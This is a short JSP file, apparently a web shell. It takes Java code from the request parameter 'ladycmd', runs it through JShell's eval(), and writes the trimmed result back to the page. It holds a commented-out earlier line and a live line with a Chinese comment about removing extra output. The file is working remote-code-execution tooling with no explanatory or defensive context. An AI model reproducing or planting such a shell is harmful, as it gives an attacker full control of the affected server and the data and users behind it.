<%@ page import="java.io.InputStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>


<%--<%=jdk.jshell.JShell.builder().build().eval(request.getParameter("ladycmd"))%>--%>

<%--去掉多余的输出--%>
<%=jdk.jshell.JShell.builder().build().eval(request.getParameter("ladycmd")).get(0).value().replaceAll("^\"", "").replaceAll("\"$", "")%>
